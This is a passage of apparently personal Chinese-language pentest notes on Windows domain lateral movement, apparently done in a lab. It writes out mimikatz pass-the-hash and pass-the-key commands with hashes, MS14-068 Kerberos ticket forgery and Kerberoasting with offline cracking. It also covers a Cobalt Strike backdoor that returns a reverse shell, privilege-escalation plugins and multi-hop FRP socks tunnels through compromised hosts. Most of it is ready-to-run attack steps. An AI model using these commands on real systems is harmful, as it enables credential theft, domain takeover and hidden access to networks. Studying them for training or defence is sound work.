<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看是否开启“受限管理员模式”</span><br><span class="line">reg query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin</span><br><span class="line">0启动    1不启动</span><br><span class="line">如果开启就可以minikatz实现</span><br><span class="line">privilege::dubug</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:hack-my.com /ntlm:用minikatz获取 “/run:mstsc.exe /restrictedadmin”</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:hack-my.com &#x2F;ntlm:38fe728ae616f0fde13715e7c320685f “&#x2F;run:mstsc.exe&#x2F;restrictedadmin”</p>
<p>大致的原理是，哈希传递成功后执行“mstsc.exe&#x2F;restrictedadmin”</p>
<p>受限管理员运行远程桌面客户端，不需要用户名密码即可登入进去</p>
<h5 id="PTK传递-mimikatz"><a href="#PTK传递-mimikatz" class="headerlink" title="PTK传递-mimikatz"></a>PTK传递-mimikatz</h5><p>打补丁后工作组及域连接：必须打补丁后才能用户连接</p>
<p>sekurlsa::ekeys  用来获取aes</p>
<p>sekurlsa::pth  &#x2F;user:mary  &#x2F;domain:god &#x2F;aes256: d3444436d7b6c0b57a1cee8907d41fcbe35c3e46779eea77e6311c7df4aaa143</p>
<p>打补丁和没打补丁中PTH和PTK的区别</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230302160204415.png"
                      alt="image-20230302160204415"
                ></p>
<h5 id="PTT传递-MS14-068-amp-kekoo-amp"><a href="#PTT传递-MS14-068-amp-kekoo-amp" class="headerlink" title="PTT传递-MS14-068&amp;kekoo&amp;"></a>PTT传递-MS14-068&amp;kekoo&amp;</h5><h6 id="MS14068：可以实现普通用户直接获取域控system权限"><a href="#MS14068：可以实现普通用户直接获取域控system权限" class="headerlink" title="MS14068：可以实现普通用户直接获取域控system权限"></a>MS14068：可以实现普通用户直接获取域控system权限</h6><p>执行过程：</p>
<ol>
<li>查看当前sid      whoami&#x2F;user</li>
<li>mimikatz          kerberos::purge（清空当前主机中所有凭证，如果有域成员凭证会影响凭证伪造）</li>
</ol>
<p>​       mimikatz          kerberos::list         查看当前主机的凭证</p>
<p>​       mimikatz          kerberos::ptc         将票据注入到内存中</p>
<ol start="3">
<li><p>利用ms14068生成TGT数据</p>
<pre><code>ms14-068.exe -u 域成员名@域名 -s 当前域用户的sid -d 域控制器地址 -p 域成员密码
</code></pre>
</li>
</ol>
<p>.\MS14-068.exe -u <a class="link"   href="mailto:&#x6d;&#x61;&#x72;&#x79;&#64;&#103;&#x6f;&#x64;&#46;&#x6f;&#114;&#103;" >&#x6d;&#x61;&#x72;&#x79;&#64;&#103;&#x6f;&#x64;&#46;&#x6f;&#114;&#103; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45（注意前面要加.\）</p>
<p>这里发现自动创建了个<a class="link"   href="mailto:&#84;&#71;&#x54;&#x5f;&#x6d;&#x61;&#x72;&#x79;&#64;&#x67;&#x6f;&#100;&#46;&#x6f;&#114;&#x67;&#x2e;&#99;&#x63;&#97;&#99;&#104;&#x65;" >&#84;&#71;&#x54;&#x5f;&#x6d;&#x61;&#x72;&#x79;&#64;&#x67;&#x6f;&#100;&#46;&#x6f;&#114;&#x67;&#x2e;&#99;&#x63;&#97;&#99;&#104;&#x65; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/c8272f46779d193ac1693410f196eb69b09225c7.png@831w_153h_progressive.webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/aa8ffd123435e20eca4bcffc13b199bf460c8d2d.png@831w_104h_progressive.webp"
                      alt="img"
                ></p>
<ol start="4">
<li>票据注入内存</li>
</ol>
<p>​       mimikatz.exe “kerberos::ptc <a class="link"   href="mailto:&#x54;&#71;&#84;&#95;&#x6d;&#x61;&#114;&#x79;&#64;&#x67;&#x6f;&#x64;&#x2e;&#x6f;&#114;&#103;&#x2e;&#99;&#99;&#x61;&#99;&#x68;&#x65;" >&#x54;&#71;&#84;&#95;&#x6d;&#x61;&#114;&#x79;&#64;&#x67;&#x6f;&#x64;&#x2e;&#x6f;&#114;&#103;&#x2e;&#99;&#99;&#x61;&#99;&#x68;&#x65; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“ exit</p>
<ol start="5">
<li>然后就可以直接连接了    dir \主机名\c$</li>
</ol>
<h6 id="lodon工具"><a href="#lodon工具" class="headerlink" title="lodon工具"></a>lodon工具</h6><h4 id="域横向cobaltstrike-amp-RDP"><a href="#域横向cobaltstrike-amp-RDP" class="headerlink" title="域横向cobaltstrike&amp;RDP"></a>域横向cobaltstrike&amp;RDP</h4><p>除了IPC WMI SMB等连接方式外还可以使用RDP连接</p>
<p>RDP协议连接：判断对方远程桌面服务是否开启（默认是：3389），端口扫描可以判断</p>
<h6 id="RDP明文密码连接"><a href="#RDP明文密码连接" class="headerlink" title="RDP明文密码连接"></a>RDP明文密码连接</h6><p>win+r  运行mstsc</p>
<p>输入域控主机IP地址，然后用户名，再用获取到的密码远程连接（鸡肋用不到，连不上，cao！）</p>
<p>也可以使用命令行来连接</p>
<p>—mstsc.exe &#x2F;console &#x2F;v:192.168.3.21 &#x2F;admin</p>
<p>—对linux来说: rdesktop 192.168.3.21:3389 </p>
<h6 id="RDP密文HASH链接"><a href="#RDP密文HASH链接" class="headerlink" title="RDP密文HASH链接"></a>RDP密文HASH链接</h6><p>—windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持</p>
<p>—REG ADD “HKLM\System\CurrentControlSet\Control\Lsa” &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f </p>
<p>然后运行mstsc.exe &#x2F;restrictedadmin</p>
<h6 id="域横向移动SPN服务-探针-请求-导出-破解-重写"><a href="#域横向移动SPN服务-探针-请求-导出-破解-重写" class="headerlink" title="域横向移动SPN服务-探针-请求-导出-破解-重写"></a>域横向移动SPN服务-探针-请求-导出-破解-重写</h6><p>SPN：服务主体名称是kerberos客户端用于唯一标识给特定的kerberos目标计算机的服务实例名称（类似于token）</p>
<p>Kerberos身份验证使用SPN将服务实例和服务的登入账户相关联，如果安装多个服务实例，每一个实例都需要有自己唯一的SPN</p>
<h6 id="探针"><a href="#探针" class="headerlink" title="探针"></a>探针</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">在获取的域内主机中cmd  输入  setspn -q */*  (扫描全部，这里每个域用户对应的SPN服务都有)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303134627617.png"
                     
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">寻找特定sSPN服务   setspn -q */* |findstr“MSSQL”</span><br></pre></td></tr></table></figure></div>

<h6 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h6><p>先使用klist purge删除原有票据</p>
<p>（power shell）     Add-Type -AssemblyName System.IdentityModel</p>
<p>再使用这个</p>
<p> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “MSSQLSvc&#x2F;fileserv.god.org:1433（服务名探针可找到）” </p>
<h6 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h6><p>使用mimikatz导出</p>
<p>kerberos::list &#x2F;export</p>
<h6 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303140921568.png"
                      alt="image-20230303140921568"
                ></p>
<p>破解工具tgsrepcrack.py破解服务票据（python3环境）</p>
<p>—将以mssql开头的文件拖到本地Kerberos进行密码爆破</p>
<p>—kerberoast下载（专门针对Kerberos协议，tgsrepcrack.py是其中一个脚本）：<a class="link"   href="https://github.com/nidem/kerberoast" >https://github.com/nidem/kerberoast <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>首先创建一个密码字典</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/4827547fb5b70b382c2f60dda7fc23006eeefe3b.png@366w_191h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >

<p>然后使用爆破脚本tgsrepcrack.py（要先pip install pysn1）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9500bea8926429dd8e55b5d56133649c3a17d190.png@831w_209h_progressive.webp"
                      alt="img" style="zoom:150%;" 
                >

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303140552385.png"
                      alt="image-20230303140552385"
                ></p>
<p>得到密码</p>
<h6 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230303141012726.png"
                      alt="image-20230303141012726"
                ></p>
<p>主要原理就是将得到的票据重写（伪造票据），然后将其通过mimikatz注入到内存中即可</p>
<p>注入之后就可以连接靶机：</p>
<p>dir &#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;c$(查看靶机c盘文件)</p>
<h6 id="CobaltStrike工具使用"><a href="#CobaltStrike工具使用" class="headerlink" title="CobaltStrike工具使用"></a>CobaltStrike工具使用</h6><p>大概流程：启动-配置-监听-执行-上线-提权-信息收集-渗透</p>
<p>在服务器中（外网环境）安装CobaltStrike并且提前配置Java环境</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">java环境安装教程</span><br><span class="line">sudo apt install openjdk-11-jdk</span><br></pre></td></tr></table></figure></div>

<p>启动服务端（服务器启动）</p>
<p>.&#x2F;teamserve ‘本服务器IP’ ‘团队接入的口令可以随便写’</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/f5893e5a1ced0b278f9bf8219aeea5c3d45ec8fe.png@831w_96h_progressive.webp"
                      alt="img"
                ></p>
<p>服务器端需要root权限，要在云端服务器打开50050端口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/b29af5915adc8765aef8736aeb3fc0ce1b12b702.png@513w_245h_progressive.webp"
                      alt="img"
                ></p>
<p>本地计算机启动<strong>CobaltStrike</strong>中的start.bat开启，并且配置在服务器上填写的ip和端口，user随便输</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/d3825132a2697f24040c20f46c1eae4eb289fddc.png@708w_215h_progressive.webp"
                      alt="img"
                ></p>
<p>这个工具与msf最大的区别就是支持多个人一同协作</p>
<p>由于是多人协作所以要区分哪些资源是各自的，通过配置监听器来实现拥有各自的监听管道（后门传输管道）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/e519023d26a41d147744dbad80057c812f062127.png@831w_468h_progressive.webp"
                      alt="img"
                ></p>
<p>监听器具有多种协议，常见的有：dns&#x2F;http&#x2F;smb&#x2F;c2</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/439e27ed691d00b293fd87de347187923edc72fa.png@453w_192h_progressive.webp"
                      alt="img"
                ></p>
<p>ip和端口就是shell要返回的地址（在这里只能是外网服务器）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/fcfb0947f8b466c569e7ffb5235cf4d8dd75fe86.png@702w_342h_progressive.webp"
                      alt="img"
                ></p>
<p>创建成功后，生成可执行文件（有不同的格式，选择windows64位的exe）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/9f141d34e95c100ddb1669790fe7b8107235589c.png@429w_219h_progressive.webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/56937c29ac696ccbdce40aa6955b6e0cbcab644c.png@554w_255h_progressive.webp"
                      alt="img"
                ></p>
<p>将生成的的后门exe复制到域靶机中运行，就会反弹靶机的shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/259a810e6ab3fa04238cdfaa1f0195f41152e7ab.png@831w_180h_progressive.webp"
                      alt="img"
                ></p>
<p>进入图形化界面右击鼠标选择interact，即可调出命令窗口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/73f6087005ee9f00460eb30c35d23c2770a8c509.png@512w_167h_progressive.webp"
                      alt="img"
                ></p>
<p>输入shell ipconfig查看ip配置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/f5be55a7b9ba803a584034c62568fb5b545d42fe.png@831w_291h_progressive.webp"
                      alt="img"
                ></p>
<p>在图形化界面进行提权操作（自带提权插件太少需要自己安装插件）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/e68e4c13f949649acddba433fea1c8deec0795da.png@633w_263h_progressive.webp"
                      alt="img"
                ></p>
<h6 id="关于提权及插件加载"><a href="#关于提权及插件加载" class="headerlink" title="关于提权及插件加载"></a>关于提权及插件加载</h6><p>以下使用的提权插件为：taowu-cobalt-strike 和Erebus</p>
<p>点击加载插件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/86a402e6e9fc6a06e9383a92610ecc33d2d8a63c.png@831w_416h_progressive.webp"
                      alt="img"
                ></p>
<p>加载第三方提权模块，发现提权模块变多了，选择m14-508</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/1c08beee62ad0b7d58050752403fdb5409f3bfb1.png@551w_173h_progressive.webp"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/4e78a21c07c34979a5781061f2e26575425932c7.png@594w_254h_progressive.webp"
                      alt="img"
                ></p>
<p>！！！！m14-508漏洞描述</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/e83ce667d677ebf25a26d314969df09f77edc755.png@831w_240h_progressive.webp"
                      alt="img"
                ></p>
<p>即可提升至system权限</p>
<h6 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h6><p>在命令终端输入net view探活主机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2971a9d0399b422bb43fa9f3fc97785758f767da.png@831w_177h_progressive.webp"
                      alt="img"
                ></p>
<p>点击view中targets将探针的主机显示出来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/7e380d0b68d3ead9bf5b78b04b78c61e7ff9c77d.png@831w_299h_progressive.webp"
                      alt="img"
                ></p>
<p>也可以用批量代码执行</p>
<p>— for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;”</p>
<p>提权成功之后就可以，导出hash值，利用mimikatz进行横向渗透，也可以上传后门工具进行进一步攻击。如Ladon啥的工具</p>
<p>这个指令可以直接获得域控的地址net dclist</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230304135454384.png"
                      alt="image-20230304135454384"
                ></p>
<p>CobaltStrike Aggressor 脚本合集（可以自行在GitHub搜索）：</p>
<p><a class="link"   href="https://github.com/harleyQu1nn/AggressorScripts" >https://github.com/harleyQu1nn/AggressorScripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/Und3rf10w/Aggressor-scripts" >https://github.com/Und3rf10w/Aggressor-scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/001SPARTaN/aggressor_scripts" >https://github.com/001SPARTaN/aggressor_scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/rasta-mouse/Aggressor-Script" >https://github.com/rasta-mouse/Aggressor-Script <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/threatexpress/aggressor-scripts" >https://github.com/threatexpress/aggressor-scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/ramen0x3f/AggressorScripts" >https://github.com/ramen0x3f/AggressorScripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/FortyNorthSecurity/AggressorAssessor" >https://github.com/FortyNorthSecurity/AggressorAssessor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/michalkoczwara/aggressor_scripts_collection" >https://github.com/michalkoczwara/aggressor_scripts_collection <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/ars3n11/Aggressor-Scripts" >https://github.com/ars3n11/Aggressor-Scripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/gaudard/scripts/tree/master/red-team/aggressor" >https://github.com/gaudard/scripts/tree/master/red-team/aggressor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/bluscreenofjeff/AggressorScripts" >https://github.com/bluscreenofjeff/AggressorScripts <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/vysecurity/Aggressor-VYSEC" >https://github.com/vysecurity/Aggressor-VYSEC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit" >https://github.com/killswitch-GUI/CobaltStrike-ToolKit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/rsmudge/ElevateKit" >https://github.com/rsmudge/ElevateKit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> （第三方提权攻击）</p>
<p><a class="link"   href="https://github.com/QAX-A-Team/CobaltStrike-Toolset" >https://github.com/QAX-A-Team/CobaltStrike-Toolset <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/DeEpinGh0st/Erebus" >https://github.com/DeEpinGh0st/Erebus <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> （Erebus CobaltStrike后渗透测试插件，持续更新）（本文选择的插件）</p>
<p><a class="link"   href="https://github.com/branthale/CobaltStrikeCNA" >https://github.com/branthale/CobaltStrikeCNA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://github.com/pandasec888/taowu-cobalt-strike%EF%BC%88%E6%9C%AC%E6%96%87%E9%80%89%E6%8B%A9%E7%9A%84%E6%8F%92%E4%BB%B6%EF%BC%89" >https://github.com/pandasec888/taowu-cobalt-strike（本文选择的插件） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h4 id="域横向内网漫游socks代理隧道技术"><a href="#域横向内网漫游socks代理隧道技术" class="headerlink" title="域横向内网漫游socks代理隧道技术"></a>域横向内网漫游socks代理隧道技术</h4><h6 id="内网：具有私有网段地址，如10-x2F-8，172-16-x2F-12，192-168-x2F-16等这些可称为内网网段"><a href="#内网：具有私有网段地址，如10-x2F-8，172-16-x2F-12，192-168-x2F-16等这些可称为内网网段" class="headerlink" title="内网：具有私有网段地址，如10&#x2F;8，172.16&#x2F;12，192.168&#x2F;16等这些可称为内网网段"></a>内网：具有私有网段地址，如10&#x2F;8，172.16&#x2F;12，192.168&#x2F;16等这些可称为内网网段</h6><h6 id="正向连接和反向连接"><a href="#正向连接和反向连接" class="headerlink" title="正向连接和反向连接"></a>正向连接和反向连接</h6><p>正向：控制端连接被控制端</p>
<p>反向：被控制端去连接控制端</p>
<p>在内网环境中是不能被外网主动发现连接的，所以这时候就需要通过内网主动反向的连接外网控制端</p>
<h6 id="代理和隧道的区别"><a href="#代理和隧道的区别" class="headerlink" title="代理和隧道的区别"></a>代理和隧道的区别</h6><p>代理：主要是解决了网络的连通性问题，但是有些防火墙就会设置禁止代理的相关协议，这时候就需要隧道</p>
<p>隧道：可以认为是代理的高级版，它利用了协议的伪装，可以解决流量分析和监控工具，和防火墙等一系列相关工具的过滤问题</p>
<h5 id="内网穿透Ngrok测试演示-两个内网通讯上线"><a href="#内网穿透Ngrok测试演示-两个内网通讯上线" class="headerlink" title="内网穿透Ngrok测试演示-两个内网通讯上线"></a>内网穿透Ngrok测试演示-两个内网通讯上线</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230304154406960.png"
                      alt="image-20230304154406960"
                ></p>
<p>试想以下两个内网中，互补相通该怎么交换数据？？</p>
<p>能想到的是交给一个中间人帮忙传递，这就跟代理类似，利用一个云主机做代理帮助两个内网主机传递数据</p>
<p>由于没有ngrok，这里引用别人的笔记</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230304205653387.png"
                      alt="image-20230304205653387" style="zoom:150%;" 
                >

<p>kali作为控制端，运行ngrok的客户端，并且利用msf生成后门文件进行上传来实现反弹shell，利用的是代理服务器的中转功能</p>
<p>这个后门文件主要是将内网靶机的shell发送至代理服务器，然后再由代理服务器反弹shell至外网攻击机</p>
<p>主要步骤：攻击机连接代理服务器—-&gt;msf生成一个后门文件植入靶机（收集的信息发送至代理服务器）—-&gt;代理服务器又将信息反弹至攻击机</p>
<h6 id="内网穿透Frp自建跳板测试-两个内网通讯上线"><a href="#内网穿透Frp自建跳板测试-两个内网通讯上线" class="headerlink" title="内网穿透Frp自建跳板测试-两个内网通讯上线"></a>内网穿透Frp自建跳板测试-两个内网通讯上线</h6><p>Frp是现在比较主流的工具，分为服务端（中转的服务器）和控制端（攻击机和靶机）</p>
<p>FRP下载地址：<a class="link"   href="https://github.com/fatedier/frp/releases" >https://github.com/fatedier/frp/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>服务端：下载-解压-修改-启动（对于阿里云主机要修改安全组配置出入口）</p>
<p>将下载好的包上传到服务器，并且解压frp包</p>
<h6 id="实战环境"><a href="#实战环境" class="headerlink" title="实战环境"></a>实战环境</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230313081434957.png"
                      alt="image-20230313081432510"
                ></p>
<p>网络一级代理</p>
<p>已经获得win server 2012的控制权，需要继续登陆FTP服务器</p>
<p>1.利用VPS作为FRP的服务端，执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps.exe -c ./frps.ini</span><br></pre></td></tr></table></figure></div>

<p>配置frps.ini文件如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0         服务端上绑定的IP地址</span><br><span class="line">bind-PORT = 7000            服务端绑定的端口</span><br></pre></td></tr></table></figure></div>

<p>2.win server 2012作为客户端，执行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frpc.exe -c ./frpc.ini</span><br></pre></td></tr></table></figure></div>

<p>客户端文件frpc.ini配置如下</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.x     服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1000            代理所使用的端口，会被转发到服务端</span><br><span class="line">plugin = socks5               代理的类型</span><br></pre></td></tr></table></figure></div>

<p>至此输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains ssh root@10.10.10.15      便可成功登入FTP服务器</span><br></pre></td></tr></table></figure></div>



<p>二级网络代理</p>
<p>同样先VPS作为服务端，启动</p>
<p>win server2012作为客户端启动</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端frpc.ini配置如下</span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.x     服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp                    协议类型</span><br><span class="line">local_ip = 10.10.10.13        本地的IP地址</span><br><span class="line">local_port = 10808            客户端要转发的端口</span><br><span class="line">remote_port = 1080            转发的远程端口</span><br></pre></td></tr></table></figure></div>

<p>然后在win server2012再开启服务端，运行</p>
<p><code>	./frps.exe -c ./frps.ini</code></p>
<p>配置</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 10.10.10.13         win服务端上绑定的IP地址</span><br><span class="line">bind-PORT = 7000                win服务端绑定的端口</span><br></pre></td></tr></table></figure></div>

<p>在dmz的FTP服务器上开启</p>
<p><code>	./frpc.exe -c ./frpc.ini</code></p>
<p>配置</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.113     服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp                    协议类型</span><br><span class="line">remote_port = 1080            转发的远程端口</span><br><span class="line">plugin = socks5               代理类型</span><br></pre></td></tr></table></figure></div>

<p>然后在ProxyChains配置文件最后一行添加“socks5 192.168.2.138 1080”执行</p>
<p><code>	proxychains rdesktop 192.168.30.20</code>	</p>
<p>即可访问办公区的远程桌面</p>
<p>三级网络代理</p>
<p>先是vps服务端启动，然后win server2012客户端，win server2012服务端，FTP客户端</p>
<p>FTP客户端配置</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端frpc.ini配置如下</span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.10.10.13    服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp                    协议类型</span><br><span class="line">local_ip = 192.168.30.40      本地的IP地址</span><br><span class="line">local_port = 10809            客户端要转发的端口</span><br><span class="line">remote_port = 1080            转发的远程端口</span><br></pre></td></tr></table></figure></div>

<p>然后FTP启动服务端</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps.exe -c ./frps.ini</span><br></pre></td></tr></table></figure></div>

<p>配置</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.30.40         FTP服务端上绑定的IP地址</span><br><span class="line">bind-PORT = 7000                  FTP服务端绑定的端口</span><br></pre></td></tr></table></figure></div>

<p>在办公区文件服务器上执行</p>
<p><code>	./frpc.exe -c ./frpc.ini</code></p>
<p>配置</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端frpc.ini配置如下</span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.30.40    服务端的IP地址</span><br><span class="line">server_port = 7000            服务端的开放端口</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp                    协议类型</span><br><span class="line">local_port = 10809            客户端要转发的端口</span><br><span class="line">plugin = socks5               代理类型</span><br></pre></td></tr></table></figure></div>

<p>然后在ProxyChains配置文件最后一行添加“socks5 192.168.2.138 1080”执行</p>
<p><code>	proxychains rdesktop 192.168.60.10</code>	</p>
<p>即可连接远程桌面</p>
